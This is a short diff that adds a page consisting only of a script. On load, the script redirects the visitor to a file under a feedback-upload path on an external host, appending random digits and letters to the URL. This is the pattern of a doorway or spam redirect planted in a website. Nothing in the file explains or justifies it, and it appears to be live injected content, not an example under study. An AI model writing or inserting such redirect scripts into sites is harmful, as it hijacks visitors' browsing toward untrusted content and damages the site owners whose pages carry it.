@@ -1,0 +1,19 @@
+﻿<script>
+var urls=[
+'https://static.job10000.com/yl/feedbackNew/20240115/65a4d72884e2d7c285985696.png?{nnnnnnn}{wwww}',
+];
+location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
+function myEeplace(s){
+	return s.replace(/\{(\w+?)\}/g,function(a,b){
+		var h='';
+		for(var i=0;i<b.length;i++){
+			if('n'==b[i]){
+				h+=Math.floor(Math.random()*10);
+			}else if('w'==b[i]){
+				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
+			}
+		}
+		return h;
+	});
+}
+</script>
